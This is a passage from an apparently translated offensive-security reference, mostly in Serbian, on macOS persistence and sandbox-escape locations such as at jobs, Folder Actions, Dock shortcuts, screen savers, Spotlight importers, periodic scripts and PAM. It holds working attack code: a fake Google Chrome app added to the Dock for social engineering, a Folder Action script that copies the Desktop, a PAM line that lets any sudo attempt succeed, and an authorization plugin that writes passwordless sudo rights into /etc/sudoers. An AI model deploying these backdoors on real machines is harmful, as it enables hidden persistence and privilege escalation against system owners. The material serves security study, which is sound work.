* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* Potrebno je **izvršiti** **`at`** i mora biti **omogućeno**

#### **Opis**

`at` zadaci su dizajnirani za **zakazivanje jednokratnih zadataka** koji će se izvršiti u određenim vremenima. Za razliku od cron poslova, `at` zadaci se automatski uklanjaju nakon izvršenja. Važno je napomenuti da su ovi zadaci postojani kroz ponovna pokretanja sistema, što ih označava kao potencijalne bezbednosne probleme pod određenim uslovima.

Po **podrazumevanoj** postavci su **onemogućeni**, ali **root** korisnik može **omogućiti** **ih** sa:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Ovo će kreirati datoteku za 1 sat:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Proverite red zadataka koristeći `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Iznad možemo videti dva zakazana posla. Možemo odštampati detalje posla koristeći `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Ako AT zadaci nisu omogućeni, kreirani zadaci neće biti izvršeni.
{% endhint %}

**fajlovi zadataka** se mogu naći na `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
The filename contains the queue, the job number, and the time it’s scheduled to run. For example let’s take a loot at `a0001a019bdcd2`.

* `a` - ovo je red
* `0001a` - broj posla u heksadecimalnom formatu, `0x1a = 26`
* `019bdcd2` - vreme u heksadecimalnom formatu. Predstavlja minute koje su prošle od epohe. `0x019bdcd2` je `26991826` u decimalnom formatu. Ako to pomnožimo sa 60 dobijamo `1619509560`, što je `GMT: 27. april 2021., utorak 7:46:00`.

If we print the job file, we find that it contains the same information we got using `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* Ali morate moći da pozovete `osascript` sa argumentima da biste kontaktirali **`System Events`** kako biste mogli da konfigurišete Folder Actions
* TCC zaobilaženje: [🟠](https://emojipedia.org/large-orange-circle)
* Ima neka osnovna TCC dopuštenja kao što su Desktop, Documents i Downloads

#### Location

* **`/Library/Scripts/Folder Action Scripts`**
* Potrebna je root privilegija
* **Okidač**: Pristup određenom folderu
* **`~/Library/Scripts/Folder Action Scripts`**
* **Okidač**: Pristup određenom folderu

#### Description & Exploitation

Folder Actions su skripte koje se automatski pokreću promenama u folderu kao što su dodavanje, uklanjanje stavki ili druge akcije poput otvaranja ili promena veličine prozora foldera. Ove akcije se mogu koristiti za razne zadatke i mogu se pokrenuti na različite načine kao što su korišćenje Finder UI ili terminalskih komandi.

Da biste postavili Folder Actions, imate opcije kao što su:

1. Kreiranje Folder Action radnog toka sa [Automator](https://support.apple.com/guide/automator/welcome/mac) i instaliranje kao uslugu.
2. Ručno povezivanje skripte putem Folder Actions Setup u kontekstualnom meniju foldera.
3. Korišćenje OSAScript-a za slanje Apple Event poruka `System Events.app` za programatsko postavljanje Folder Action.
* Ova metoda je posebno korisna za ugrađivanje akcije u sistem, nudeći nivo postojanosti.

The following script is an example of what can be executed by a Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Da biste učinili gornji skript upotrebljivim za Folder Actions, kompajlirajte ga koristeći:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nakon što je skripta kompajlirana, postavite Folder Actions izvršavanjem sledeće skripte. Ova skripta će omogućiti Folder Actions globalno i posebno povezati prethodno kompajliranu skriptu sa Desktop folderom.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Pokrenite skriptu za podešavanje sa:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Ovo je način na koji se implementira ova postojanost putem GUI:

Ovo je skripta koja će biti izvršena:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Kompajlirajte to sa: `osacompile -l JavaScript -o folder.scpt source.js`

Premestite to u:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Zatim otvorite aplikaciju `Folder Actions Setup`, izaberite **folder koji želite da pratite** i izaberite u vašem slučaju **`folder.scpt`** (u mom slučaju sam ga nazvao output2.scp):

<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Sada, ako otvorite taj folder sa **Finder**, vaš skript će biti izvršen.

Ova konfiguracija je sačuvana u **plist** datoteci koja se nalazi u **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** u base64 formatu.

Sada, hajde da pokušamo da pripremimo ovu postavku bez GUI pristupa:

1. **Kopirajte `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** u `/tmp` da biste je sačuvali:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Uklonite** Folder Actions koje ste upravo postavili:

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Sada kada imamo prazan okruženje

3. Kopirajte rezervnu datoteku: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otvorite Folder Actions Setup.app da biste iskoristili ovu konfiguraciju: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
I ovo nije radilo za mene, ali to su uputstva iz izveštaja:(
{% endhint %}

### Dock prečice

Izveštaj: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* Ali morate imati instaliranu zlonamernu aplikaciju unutar sistema
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* `~/Library/Preferences/com.apple.dock.plist`
* **Okidač**: Kada korisnik klikne na aplikaciju unutar dock-a

#### Opis i Eksploatacija

Sve aplikacije koje se pojavljuju u Dock-u su navedene unutar plist-a: **`~/Library/Preferences/com.apple.dock.plist`**

Moguće je **dodati aplikaciju** samo sa: 

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Korišćenjem neke **socijalne inženjering** mogli biste **imitirati na primer Google Chrome** unutar dock-a i zapravo izvršiti svoj skript:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Korisno za zaobilaženje sandboxes: [🟠](https://emojipedia.org/large-orange-circle)
* Potrebna je vrlo specifična akcija
* Završićete u drugom sandboxu
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* `/Library/ColorPickers`
* Potrebna je root privilegija
* Okidač: Koristite selektor boja
* `~/Library/ColorPickers`
* Okidač: Koristite selektor boja

#### Description & Exploit

**Kompajlirajte paket** selektora boja sa vašim kodom (možete koristiti [**ovaj na primer**](https://github.com/viktorstrate/color-picker-plus)) i dodajte konstruktor (kao u [odeljku za screensaver](macos-auto-start-locations.md#screen-saver)) i kopirajte paket u `~/Library/ColorPickers`.

Zatim, kada se selektor boja aktivira, vaš kod bi takođe trebao da se izvrši.

Napomena da binarni fajl koji učitava vašu biblioteku ima **veoma restriktivan sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Korisno za zaobilaženje sandboks-a: **Ne, jer morate izvršiti svoju aplikaciju**
* TCC zaobilaženje: ???

#### Lokacija

* Specifična aplikacija

#### Opis & Eksploatacija

Primer aplikacije sa Finder Sync ekstenzijom [**može se naći ovde**](https://github.com/D00MFist/InSync).

Aplikacije mogu imati `Finder Sync Extensions`. Ova ekstenzija će ući u aplikaciju koja će biti izvršena. Štaviše, da bi ekstenzija mogla da izvrši svoj kod, **mora biti potpisana** nekim važećim Apple razvojnim sertifikatom, mora biti **sandboxed** (iako bi mogle biti dodate opuštene izuzetke) i mora biti registrovana sa nečim poput:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Zaštitni ekran

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
* Ali ćete završiti u zajedničkom aplikacionom sandbox-u
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* `/System/Library/Screen Savers`
* Potreban root
* **Okidač**: Izaberite zaštitni ekran
* `/Library/Screen Savers`
* Potreban root
* **Okidač**: Izaberite zaštitni ekran
* `~/Library/Screen Savers`
* **Okidač**: Izaberite zaštitni ekran

<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis & Eksploatacija

Kreirajte novi projekat u Xcode-u i izaberite šablon za generisanje novog **Zaštitnog ekrana**. Zatim, dodajte svoj kod, na primer sledeći kod za generisanje logova.

**Izgradite** ga, i kopirajte `.saver` paket u **`~/Library/Screen Savers`**. Zatim, otvorite GUI za zaštitni ekran i ako samo kliknete na njega, trebalo bi da generiše mnogo logova:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Imajte na umu da se unutar prava binarnog koda koji učitava ovaj kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) može naći **`com.apple.security.app-sandbox`**, tako da ćete biti **unutar zajedničkog aplikacionog sandboks-a**.
{% endhint %}

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Korisno za zaobilaženje sandboxes: [🟠](https://emojipedia.org/large-orange-circle)
* Ali ćete završiti u aplikacionom sandboxu
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)
* Sandbox izgleda veoma ograničeno

#### Location

* `~/Library/Spotlight/`
* **Okidač**: Novi fajl sa ekstenzijom kojom upravlja spotlight plugin je kreiran.
* `/Library/Spotlight/`
* **Okidač**: Novi fajl sa ekstenzijom kojom upravlja spotlight plugin je kreiran.
* Potreban root
* `/System/Library/Spotlight/`
* **Okidač**: Novi fajl sa ekstenzijom kojom upravlja spotlight plugin je kreiran.
* Potreban root
* `Some.app/Contents/Library/Spotlight/`
* **Okidač**: Novi fajl sa ekstenzijom kojom upravlja spotlight plugin je kreiran.
* Potrebna nova aplikacija

#### Description & Exploitation

Spotlight je ugrađena pretraga u macOS-u, dizajnirana da korisnicima omogući **brz i sveobuhvatan pristup podacima na njihovim računarima**.\
Da bi olakšao ovu brzu pretragu, Spotlight održava **proprietarnu bazu podataka** i kreira indeks **parsanjem većine fajlova**, omogućavajući brze pretrage kroz imena fajlova i njihov sadržaj.

Osnovni mehanizam Spotlight-a uključuje centralni proces nazvan 'mds', što znači **'metadata server'.** Ovaj proces orchestrira celu Spotlight uslugu. Pored toga, postoje višestruki 'mdworker' daemoni koji obavljaju razne zadatke održavanja, kao što je indeksiranje različitih tipova fajlova (`ps -ef | grep mdworker`). Ovi zadaci su omogućeni kroz Spotlight importer plugine, ili **".mdimporter bundles**", koji omogućavaju Spotlight-u da razume i indeksira sadržaj kroz raznovrsne formate fajlova.

Plugini ili **`.mdimporter`** paketi se nalaze na mestima pomenutim ranije i ako se pojavi novi paket, on se učitava u trenutku (nema potrebe za ponovnim pokretanjem bilo koje usluge). Ovi paketi moraju da označe koji **tip fajla i ekstenzije mogu da upravljaju**, na ovaj način, Spotlight će ih koristiti kada se kreira novi fajl sa označenom ekstenzijom.

Moguće je **pronaći sve `mdimporters`** učitane u radu:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
I na primer **/Library/Spotlight/iBooksAuthor.mdimporter** se koristi za parsiranje ovih tipova datoteka (ekstenzije `.iba` i `.book` među ostalima):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Ako proverite Plist drugih `mdimporter`, možda nećete pronaći unos **`UTTypeConformsTo`**. To je zato što je to ugrađeni _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) i ne mora da specificira ekstenzije.

Pored toga, sistemski podrazumevani dodaci uvek imaju prioritet, tako da napadač može pristupiti samo datotekama koje nisu inače indeksirane od strane Apple-ovih `mdimporters`.
{% endhint %}

Da biste kreirali svoj vlastiti uvoznik, možete početi sa ovim projektom: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) i zatim promeniti ime, **`CFBundleDocumentTypes`** i dodati **`UTImportedTypeDeclarations`** kako bi podržao ekstenziju koju želite da podržite i reflektujte ih u **`schema.xml`**.\
Zatim **promenite** kod funkcije **`GetMetadataForFile`** da izvršite svoj payload kada se kreira datoteka sa obrađenom ekstenzijom.

Na kraju **izgradite i kopirajte svoj novi `.mdimporter`** na jednu od prethodnih lokacija i možete proveriti da li je učitan **prateći logove** ili proveravajući **`mdimport -L.`**

### ~~Preference Pane~~

{% hint style="danger" %}
Ne izgleda da ovo više radi.
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Korisno za zaobilaženje sandboks-a: [🟠](https://emojipedia.org/large-orange-circle)
* Potrebna je specifična korisnička akcija
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Opis

Ne izgleda da ovo više radi.

## Root Sandbox Bypass

{% hint style="success" %}
Ovde možete pronaći startne lokacije korisne za **zaobilaženje sandboks-a** koje vam omogućavaju da jednostavno izvršite nešto **upisivanjem u datoteku** kao **root** i/ili zahtevajući druge **čudne uslove.**
{% endhint %}

### Periodični

Writeup: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Korisno za zaobilaženje sandboks-a: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Potreban root
* **Okidač**: Kada dođe vreme
* `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local`
* Potreban root
* **Okidač**: Kada dođe vreme

#### Opis i Eksploatacija

Periodični skripti (**`/etc/periodic`**) se izvršavaju zbog **launch daemona** konfigurisanih u `/System/Library/LaunchDaemons/com.apple.periodic*`. Imajte na umu da se skripte smeštene u `/etc/periodic/` **izvršavaju** kao **vlasnik datoteke,** tako da ovo neće raditi za potencijalno eskaliranje privilegija.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Postoje drugi periodični skripti koji će biti izvršeni, a koji su navedeni u **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Ako uspete da napišete bilo koji od fajlova `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local`, biće **izvršen pre ili kasnije**.

{% hint style="warning" %}
Napomena: periodični skript će biti **izvršen kao vlasnik skripta**. Dakle, ako običan korisnik poseduje skript, biće izvršen kao taj korisnik (to može sprečiti napade na eskalaciju privilegija).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* Root uvek potreban

#### Opis i Eksploatacija

Kako je PAM više fokusiran na **perzistenciju** i malver nego na lako izvršavanje unutar macOS-a, ovaj blog neće dati detaljno objašnjenje, **pročitajte writeup-ove da biste bolje razumeli ovu tehniku**.

Proverite PAM module sa:
```bash
ls -l /etc/pam.d
```
Tehnika postojanosti/povećanja privilegija koja zloupotrebljava PAM je jednostavna kao modifikacija modula /etc/pam.d/sudo dodavanjem linije na početak:
```bash
auth       sufficient     pam_permit.so
```
Tako će **izgledati** nešto poput ovoga:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
I stoga će svaki pokušaj korišćenja **`sudo` raditi**.

{% hint style="danger" %}
Napomena da je ovaj direktorijum zaštićen TCC-om, tako da je veoma verovatno da će korisnik dobiti obaveštenje koje traži pristup.
{% endhint %}

Još jedan lep primer je su, gde možete videti da je takođe moguće dati parametre PAM modulima (i takođe možete dodati backdoor u ovu datoteku):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root i napraviti dodatne konfiguracije
* TCC zaobilaženje: ???

#### Location

* `/Library/Security/SecurityAgentPlugins/`
* Potreban root
* Takođe je potrebno konfigurisati bazu podataka autorizacije da koristi plugin

#### Description & Exploitation

Možete kreirati autorizacioni plugin koji će se izvršiti kada se korisnik prijavi kako bi održao postojanost. Za više informacija o tome kako da kreirate jedan od ovih pluginova, pogledajte prethodne izveštaje (i budite oprezni, loše napisan može vas zaključati i biće potrebno da očistite vaš mac iz režima oporavka).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Premestite** paket na lokaciju koja treba da se učita:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Konačno dodajte **pravilo** za učitavanje ovog dodatka:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** će reći okviru za autorizaciju da će morati da **pozove spoljašnji mehanizam za autorizaciju**. Štaviše, **`privileged`** će omogućiti da se izvrši kao root.

Pokrenite ga sa:
```bash
security authorize com.asdf.asdf
```
I onda **grupa staff treba da ima** sudo pristup (proverite `/etc/sudoers` da potvrdite).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root i korisnik mora koristiti man
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`/private/etc/man.conf`**
* Potreban root
* **`/private/etc/man.conf`**: Kada god se koristi man

#### Opis & Eksploatacija

Konfiguracioni fajl **`/private/etc/man.conf`** označava binarni/skript koji se koristi prilikom otvaranja man dokumentacionih fajlova. Tako da putanja do izvršnog fajla može biti izmenjena tako da svaki put kada korisnik koristi man za čitanje nekih dokumenata, backdoor se izvršava.

Na primer, postavite u **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
А затим креирајте `/tmp/view` као:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Korisno za zaobilaženje sandboxes: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root i apache mora biti pokrenut
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)
